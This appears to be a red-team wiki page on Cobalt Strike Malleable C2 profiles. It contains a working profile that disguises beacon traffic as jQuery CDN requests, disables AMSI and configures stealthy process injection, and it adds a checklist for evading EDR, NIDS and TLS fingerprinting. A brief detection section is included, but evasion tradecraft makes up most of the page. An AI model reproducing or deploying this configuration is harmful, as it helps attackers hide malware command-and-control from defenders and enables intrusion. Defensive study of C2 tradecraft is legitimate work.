---
title: Cobalt Strike — Malleable C2 profiles
slug: cobalt-strike-malleable-c2-profiles
---

> **TL;DR:** Malleable C2 is Cobalt Strike's DSL for reshaping HTTP/S beacon traffic to mimic any web service. A good profile changes URIs, headers, user-agent, body encoding, sleep/jitter, and process-injection internals so the Beacon doesn't look like a beacon to NIDS / TLS-fingerprint detectors.

## What it is
The Cobalt Strike Team Server compiles a `.profile` file into the Beacon DLL at start. Profile sections control:
- `http-get` / `http-post` / `http-stager` — request shape
- `process-inject` — how injected modules look in memory
- `post-ex` — post-exploit behaviour (thread names, AMSI patch)
- `stage` — what the staged DLL looks like
- `dns-beacon` — DNS-tunnelled C2 variants

Profiles are loaded once at Team Server start. Changing requires restart; pre-prepare per-engagement.

## Preconditions / where it applies
- Licensed Cobalt Strike (commercial); free analogues in [[sliver-c2-deep]], [[mythic-framework-deep]], [[havoc-c2-deep]]
- Red team engagement with documented C2 infrastructure approval
- Target SOC has NIDS + TLS / JA3 / JA4 fingerprinting in play (otherwise profile work is wasted)

## Tradecraft

**Anatomy of a profile (shortened example):**

```c
set sleeptime "45000";
set jitter    "37";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

http-get {
    set uri "/jquery-3.3.1.min.js";
    client {
        header "Host" "ajax.googleapis.com";
        header "Accept" "*/*";
        header "Accept-Encoding" "gzip, deflate, br";
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            base64url;
            prepend "/* jQuery v3.3.1 */ ";
            print;
        }
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x21";
}

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrtl "false";
    transform-x64 {
        prepend "\x90\x90";
        append "\x90\x90";
    }
    execute {
        SetThreadContext;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

stage {
    set userwx "false";
    set cleanup "true";
    set sleep_mask "true";
    transform-x64 {
        strrep "ReflectiveLoader" "DataLoader";
        strrep "beacon.dll" "data.dll";
    }
}
```

**Mimicry pattern — pick a real service the target uses heavily:**
- Match URIs, query params, header order, body MIME, cookie names
- Capture a real request with Burp → translate to profile sections
- Verify with `c2lint` (ships with CS): `./c2lint myprofile.profile`

**Critical settings:**
- `sleeptime` + `jitter` — long jitter is the simplest evasion against beaconing-frequency analytics
- `userwx false` — never allocate RWX memory; defeats common EDR heuristics
- `sleep_mask true` — beacon encrypts itself during sleep (CS 4.5+)
- `stage.cleanup true` — frees stager memory after Beacon launches
- `process-inject.allocator NtMapViewOfSection` — shared section mapping looks legitimate vs `VirtualAllocEx`
- `smartinject true` — passes loader addresses inline instead of resolving via PEB walk (lower EDR signal)
- `obfuscate true` — randomises in-memory string layout, AT&T-style telltales

**TLS / JA3 management** (profile alone doesn't fix this):
- Use Apache/Nginx + Let's Encrypt + a reverse-proxy redirector
- Configure cipher suite ordering to match the impersonated browser
- Rotate certs per engagement; the cert SANs are queried by analysts

**Stageless vs staged Beacon:**
- Stager hits `/get-stage` URI first — common detection target
- Stageless DLL/EXE bypasses the staging round-trip; recommended for serious operations
- Build stageless via Artifact Kit / [[bof-cobalt-strike-development]] for full customisation

**Profile linting and validation:**

```bash
./c2lint c2profiles/my-profile.profile
# Reports: detection risks, ambiguous transforms, missing sections
```

**Per-engagement hardening checklist:**
- ✅ Profile written from a real-target traffic capture, not generic example
- ✅ JA3/JA3S of redirector matches target user-agent
- ✅ `userwx false`, `sleep_mask true`, `smartinject true`
- ✅ Spawnto pointing at low-noise binaries (avoid `notepad.exe`, `rundll32.exe`)
- ✅ Watermark zeroed for engagement (`set watermark "0";`) — sanitised
- ✅ Stageless Beacon, not staged
- ✅ HTTPS only; HTTP listener disabled even in-lab

## Detection and defence
- JA3/JA3S fingerprinting catches CS even when URI mimicry is perfect — vendor signatures published widely
- Beacon's regular interval is detected via streaming z-score on connection timing — only `jitter ≥ 50%` survives
- Sleep mask leaves heuristic in-memory traces (XOR encrypted module + decryptor stub); EDR vendors hunt these
- `c2lint` warnings = SOC analyst warnings; if `c2lint` flags it, defenders will too
- Public profile collections (BC-SECURITY, threatexpress) are widely fingerprinted — use as starting reference, not as-is

## OPSEC pitfalls
- `set watermark` MUST match licensed value; mismatch corrupts beacon and looks like malware on disk
- Profile must reload via Team Server restart — easy to forget which profile is active
- The `Host:` header in profile must match the redirector's actual cert SAN, or TLS errors leak
- Multi-listener engagements: profile applies per Team Server; for distinct profiles, run multiple Team Servers behind one redirector

## References
- [Cobalt Strike — Malleable C2 docs](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm)
- [BC-SECURITY Malleable-C2-Profiles repo](https://github.com/BC-SECURITY/Malleable-C2-Profiles) — community starters
- [threatexpress malleable-c2](https://github.com/threatexpress/malleable-c2) — older but well-commented
- [SpecterOps — Hiding Beacon profile](https://posts.specterops.io/)
- [JA3/JA3S — Salesforce engineering](https://github.com/salesforce/ja3)

See also: [[c2-protocol-design]], [[c2-frameworks]], [[infrastructure-design]], [[domain-fronting-and-cdn-abuse]], [[havoc-c2-deep]], [[sliver-c2-deep]], [[mythic-framework-deep]], [[bof-cobalt-strike-development]], [[caldera-mitre-emulation]], [[edr-hooks-and-unhooking]]
